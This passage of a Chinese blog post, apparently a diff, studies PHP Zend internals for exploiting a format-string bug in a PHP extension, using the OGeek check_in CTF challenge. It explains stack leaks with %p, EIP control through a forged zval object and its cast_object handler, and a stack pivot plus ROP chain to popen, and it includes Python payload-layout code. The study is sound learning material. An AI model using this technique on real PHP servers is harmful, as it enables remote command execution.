+<p><code>%p</code>和<code>%n</code>的实现跟c语言中的<code>printf</code>函数类似，<code>%p</code>将<code>ap</code>下一个偏移位置的数据强制转为16进制字符串，<code>%n</code>是向<code>ap</code>下一个偏移位置写入当前需要打印的字符长度。<code>%Z</code>是它特有的，将<code>ap</code>下一个偏移位置的数据转化为zval指针类型，然后调用<code>zend_make_printable_zval</code>将<code>zval</code>数据类型转化为字符串，跟进一下<code>zend_make_printable_zval</code>函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Zend/zend.c</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">int</span> <span class="title">zend_make_printable_zval</span><span class="params">(zval *expr, zval *expr_copy)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Z_TYPE_P(expr) == IS_STRING) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ZVAL_STR(expr_copy, _zval_get_string_func(expr));</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZEND_API zend_string* ZEND_FASTCALL _zval_get_string_func(zval *op) <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">try_again:</span><br><span class="line">	<span class="keyword">switch</span> (Z_TYPE_P(op)) &#123;</span><br><span class="line">		<span class="keyword">case</span> IS_UNDEF:</span><br><span class="line">		<span class="keyword">case</span> IS_NULL:</span><br><span class="line">		<span class="keyword">case</span> IS_FALSE:</span><br><span class="line">			<span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line">		<span class="keyword">case</span> IS_TRUE:</span><br><span class="line">			<span class="keyword">return</span> ZSTR_CHAR(<span class="string">'1'</span>);</span><br><span class="line">		<span class="keyword">case</span> IS_RESOURCE: &#123;</span><br><span class="line">			<span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(<span class="string">"Resource id #"</span>) + MAX_LENGTH_OF_LONG];</span><br><span class="line">			<span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">			len = <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Resource id #"</span> ZEND_LONG_FMT, (zend_long)Z_RES_HANDLE_P(op));</span><br><span class="line">			<span class="keyword">return</span> zend_string_init(buf, len, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_LONG: &#123;</span><br><span class="line">			<span class="keyword">return</span> zend_long_to_str(Z_LVAL_P(op));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_DOUBLE: &#123;</span><br><span class="line">			<span class="keyword">return</span> zend_strpprintf(<span class="number">0</span>, <span class="string">"%.*G"</span>, (<span class="keyword">int</span>) EG(precision), Z_DVAL_P(op));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_ARRAY:</span><br><span class="line">			zend_error(E_NOTICE, <span class="string">"Array to string conversion"</span>);</span><br><span class="line">			<span class="keyword">return</span> zend_string_init(<span class="string">"Array"</span>, <span class="keyword">sizeof</span>(<span class="string">"Array"</span>)<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">case</span> IS_OBJECT: &#123;</span><br><span class="line">			zval tmp;</span><br><span class="line">			<span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object) &#123;</span><br><span class="line">				<span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line">					<span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">				zval *z = Z_OBJ_HT_P(op)-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line">				<span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">					zend_string *str = zval_get_string(z);</span><br><span class="line">					zval_ptr_dtor(z);</span><br><span class="line">					<span class="keyword">return</span> str;</span><br><span class="line">				&#125;</span><br><span class="line">				zval_ptr_dtor(z);</span><br><span class="line">			&#125;</span><br><span class="line">			zend_error(EG(exception) ? E_ERROR : E_RECOVERABLE_ERROR, <span class="string">"Object of class %s could not be converted to string"</span>, ZSTR_VAL(Z_OBJCE_P(op)-&gt;name));</span><br><span class="line">			<span class="keyword">return</span> ZSTR_EMPTY_ALLOC();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> IS_REFERENCE:</span><br><span class="line">			op = Z_REFVAL_P(op);</span><br><span class="line">			<span class="keyword">goto</span> try_again;</span><br><span class="line">		<span class="keyword">case</span> IS_STRING:</span><br><span class="line">			<span class="keyword">return</span> zend_string_copy(Z_STR_P(op));</span><br><span class="line">		EMPTY_SWITCH_DEFAULT_CASE()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在函数 <code>_zval_get_string_func</code> 中可以看到在php中非常熟悉的转换为字符串的问题，例如数组被转化为<code>Array</code>字符串。其中需要关注的是<code>IS_OBJECT</code>时的转换，将宏展开是是下面的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;cast_object ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((*op).value.obj)-&gt;handlers-&gt;cast_object(op, &amp;tmp, IS_STRING) == SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> Z_STR(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>) &#123;</span><br><span class="line">    zval *z = ((*op).value.obj)-&gt;handlers-&gt;<span class="built_in">get</span>(op, &amp;tmp);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(z) != IS_OBJECT) &#123;</span><br><span class="line">        zend_string *str = zval_get_string(z);</span><br><span class="line">        zval_ptr_dtor(z);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    zval_ptr_dtor(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时需要补充一下php中的一些关键的结构体定义：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Zend/zend_types.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_4(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				zend_uchar    const_flags,</span><br><span class="line">				zend_uchar    reserved)	    <span class="comment">/* call info for EX(This) */</span></span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> type_info;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     cache_slot;           <span class="comment">/* literal cache slot */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>php中的所有变量都存储在<code>zval</code>这样的结构体中，它所对应的变量类型由type这个字段标识，它的值是由value确定，它永远是一个指针类型, <code>type</code>和<code>value</code>的定义如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF					0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL						1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE					2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE						3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG						4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE					5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING					6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY					7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT					8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE					9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE				10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT					11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST				12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL					13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE					14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE					19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID						18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             	15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR						17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR					20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="keyword">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="keyword">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span> w1;</span><br><span class="line">		<span class="keyword">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure>
+
+<p>php对<code>value</code>指针指向的不同类型都进行了定义，例如:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="keyword">size_t</span>            len;</span><br><span class="line">	<span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_array</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_4(</span><br><span class="line">				zend_uchar    flags,</span><br><span class="line">				zend_uchar    nApplyCount,</span><br><span class="line">				zend_uchar    nIteratorsCount,</span><br><span class="line">				zend_uchar    consistency)</span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> flags;</span><br><span class="line">	&#125; u;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nTableMask;</span><br><span class="line">	Bucket           *arData;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nNumUsed;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nNumOfElements;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nTableSize;</span><br><span class="line">	<span class="keyword">uint32_t</span>          nInternalPointer;</span><br><span class="line">	zend_long         nNextFreeElement;</span><br><span class="line">	<span class="keyword">dtor_func_t</span>       pDestructor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	<span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	<span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">	HashTable        *properties;</span><br><span class="line">	zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><code>_zend_object</code>的<code>handlers</code>指向一个函数指针数组，存储<code>_zend_object</code>相关函数的地址，<code>zend_object_handlers</code>的定义如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object_handlers</span> &#123;</span></span><br><span class="line">	<span class="comment">/* offset of real object header (usually zero) */</span></span><br><span class="line">	<span class="keyword">int</span>										offset;</span><br><span class="line">	<span class="comment">/* general object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_free_obj_t</span>					free_obj;</span><br><span class="line">	<span class="keyword">zend_object_dtor_obj_t</span>					dtor_obj;</span><br><span class="line">	<span class="keyword">zend_object_clone_obj_t</span>					clone_obj;</span><br><span class="line">	<span class="comment">/* individual object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_read_property_t</span>				read_property;</span><br><span class="line">	<span class="keyword">zend_object_write_property_t</span>			write_property;</span><br><span class="line">	<span class="keyword">zend_object_read_dimension_t</span>			read_dimension;</span><br><span class="line">	<span class="keyword">zend_object_write_dimension_t</span>			write_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_property_ptr_ptr_t</span>		get_property_ptr_ptr;</span><br><span class="line">	<span class="keyword">zend_object_get_t</span>						<span class="built_in">get</span>;</span><br><span class="line">	<span class="keyword">zend_object_set_t</span>						<span class="built_in">set</span>;</span><br><span class="line">	<span class="keyword">zend_object_has_property_t</span>				has_property;</span><br><span class="line">	<span class="keyword">zend_object_unset_property_t</span>			unset_property;</span><br><span class="line">	<span class="keyword">zend_object_has_dimension_t</span>				has_dimension;</span><br><span class="line">	<span class="keyword">zend_object_unset_dimension_t</span>			unset_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_properties_t</span>			get_properties;</span><br><span class="line">	<span class="keyword">zend_object_get_method_t</span>				get_method;</span><br><span class="line">	<span class="keyword">zend_object_call_method_t</span>				call_method;</span><br><span class="line">	<span class="keyword">zend_object_get_constructor_t</span>			get_constructor;</span><br><span class="line">	<span class="keyword">zend_object_get_class_name_t</span>			get_class_name;</span><br><span class="line">	<span class="keyword">zend_object_compare_t</span>					compare_objects;</span><br><span class="line">	<span class="keyword">zend_object_cast_t</span>						cast_object;</span><br><span class="line">	<span class="keyword">zend_object_count_elements_t</span>			count_elements;</span><br><span class="line">	<span class="keyword">zend_object_get_debug_info_t</span>			get_debug_info;</span><br><span class="line">	<span class="keyword">zend_object_get_closure_t</span>				get_closure;</span><br><span class="line">	<span class="keyword">zend_object_get_gc_t</span>					get_gc;</span><br><span class="line">	<span class="keyword">zend_object_do_operation_t</span>				do_operation;</span><br><span class="line">	<span class="keyword">zend_object_compare_zvals_t</span>				compare;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>通过上述的分析，可以知道在控制格式化字符串的<code>format</code>参数之后可以使用<code>%p</code>来泄露栈数据，而且至少有两种控制EIP的方法：</p>
+<ol>
+<li>利用 <code>%n</code>，修改栈上存储的返回地址，然后跳转到指定的位置执行。</li>
+<li>利用 <code>%Z</code>，在可控的位置伪造一个<code>object</code>类型的fake<code>zval</code>，然后伪造<code>object</code>类型的函数指针数组<code>handlers</code>中的<code>get</code>或者<code>cast_object</code>函数指针为需要执行的指令地址，就可以控制EIP。</li>
+</ol>
+<p>由于php一般都运行在web环境中，无法直接交互，所以像直接修改返回地址为 <code>one_gadget</code> 的利用方法已经无法使用了，为了实现任意命令执行，仅控制EIP是不够的，而且还需要控制RDI，甚至RSI。控制寄存器的方法一般就是使用ROP chian，但是问题在于64位系统中函数调用时通过寄存器传参，并且zend内部注册的变量(我们的输入)一般都是存储在堆上，这两方面原因导致我们无法控制栈上的数据，所以就无法进行ROP chain，所以唯一可行的方案就是找能够进行栈迁移的 <code>gadget</code>，将栈迁移到可以控制的数据区域，接着再进行rop。@wupcoo大佬出的题目十分的经典，本文也是在学习他的题目后写的，下面就他的题目提供的exp进行讲解。</p>
+<h3 id="ogeek-check-in-writeup"><a href="#ogeek-check-in-writeup" class="headerlink" title="ogeek check_in writeup"></a>ogeek check_in writeup</h3><p>题目地址<a href="https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/format_string</a>，原writeup地址<a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a>。</p>
+<p>wupcoo原始的exp先泄露了<code>libphp.so</code>的加载基址，然后再libphp.so中找rop，这里泄露<code>libphp.so</code>加载基址的方法十分的凑巧，主要是利用<code>CppClass_render</code>函数再调用<code>render_s</code>函数之前会调用函数 <code>zend_read_property_ex</code>。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ZEND_API zval *<span class="title">zend_read_property_ex</span><span class="params">(zend_class_entry *scope, zval *object, zend_string *name, zend_bool silent, zval *rv)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	zval property, *value;</span><br><span class="line">	zend_class_entry *old_scope = EG(fake_scope);</span><br><span class="line"></span><br><span class="line">	EG(fake_scope) = scope;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!Z_OBJ_HT_P(object)-&gt;read_property) &#123;</span><br><span class="line">		zend_error_noreturn(E_CORE_ERROR, <span class="string">"Property %s of class %s cannot be read"</span>, ZSTR_VAL(name), ZSTR_VAL(Z_OBJCE_P(object)-&gt;name));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ZVAL_STR(&amp;property, name);</span><br><span class="line">	value = Z_OBJ_HT_P(object)-&gt;read_property(object, &amp;property, silent?BP_VAR_IS:BP_VAR_R, <span class="literal">NULL</span>, rv);</span><br><span class="line"></span><br><span class="line">	EG(fake_scope) = old_scope;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里 <code>Z_OBJ_HT_P(object)-&gt;read_property</code> 是一个指向libphp中某个函数的函数指针，是存储在r9中的，没有被清空，所以通过泄露R9就可以获得libphp.so的加载基址，但是这种办法不通用，所以被我删除了。</p>
+<p>exp中首先使用 700个 <code>%p</code> 泄露栈数据，获取一个自主可控的地址空间作为将来栈迁移的基址heap_addr以及libc.so的基址，有由于RCX的值完全可控，所以可以让RCX指向heap_addr，然后在heap_addr的位置布局object类型的fake zval，通过控制<code>object.handlers-&gt;cast_object</code>来控制EIP，将EIP劫持到指令<code>push [rcx]; rcr [rbx+0x51],0x41 ; pop rsp ;ret ;</code>的位置来进行栈迁移，并同时布局rop chain用于控制RDI和RSI，最后跳转到<code>popen</code>进行任意命令执行。栈数据构造的代码以及注释如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exp = p64(heap_addr+<span class="number">0x10</span>) <span class="comment"># heap_addr; 布局 fake zval, zval.value.obj= heap_addr+0x10 , size0f(zval)  = 0x10        </span></span><br><span class="line">exp += p64(<span class="number">0x8</span>)           <span class="comment"># heap_addr+0x8 ;   zval.type = 0x8</span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x20</span>)<span class="comment"># heap_addr+0x10 ;  布局 zend_object,   sizeof(zend_object) = 0x38 0x7f9746cd29a8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr+0x18   </span></span><br><span class="line">exp += p64(pop_ret)        <span class="comment"># heap_addr+0x20       # </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0x30</span>) <span class="comment"># heap_addr + 0x28    zend_object.handlers  = heap_addr + 0x30</span></span><br><span class="line">exp += p64(pop_rdi)        <span class="comment"># heap_addr + 0x30    布局 zend_object_handlers: sizeof(zend_object_handlers) = 0xe0 </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe8</span>) <span class="comment"># heap_addr + 0x38    指向command字符串</span></span><br><span class="line">exp += p64(pop_rsi)        <span class="comment"># heap_addr + 0x40    </span></span><br><span class="line">exp += p64(heap_addr+<span class="number">0xe0</span>) <span class="comment"># heap_addr + 0x48    指向字符串"r"</span></span><br><span class="line">exp += p64(call_popen)     <span class="comment"># heap_addr + 0x50    popen函数地址 </span></span><br><span class="line">exp += bytes(<span class="string">"CCCCCCCC"</span>*<span class="number">16</span>,encoding=<span class="string">"latin-1"</span>)  <span class="comment"># heap_addr + 0x58</span></span><br><span class="line">exp += p64(magic_addr)     <span class="comment"># heap_addr + 0xd8    伪造 zend_object_handlers-&gt;cast_object 进行栈迁移</span></span><br><span class="line">exp += bytes(<span class="string">"r"</span>,encoding=<span class="string">"latin-1"</span>)+<span class="string">b"\x00"</span>*<span class="number">7</span> <span class="comment"># heap_addr + 0xe0</span></span><br><span class="line">exp += command.ljust(<span class="number">80</span>,<span class="string">b'\x00'</span>) <span class="comment">#heap_addr + 0xe8</span></span><br><span class="line">exp += bytes(<span class="string">"AAAAAAAA"</span>,encoding=<span class="string">"latin-1"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在栈上布局<code>fake zval</code>的同时还需要考虑rop chain的布局，这个exp很有意思。</p>
+<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.wupco.cn/?p=4504" target="_blank" rel="noopener">http://www.wupco.cn/?p=4504</a></p>
+<p><a href="https://www.freebuf.com/vuls/116398.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116398.html</a></p>
+
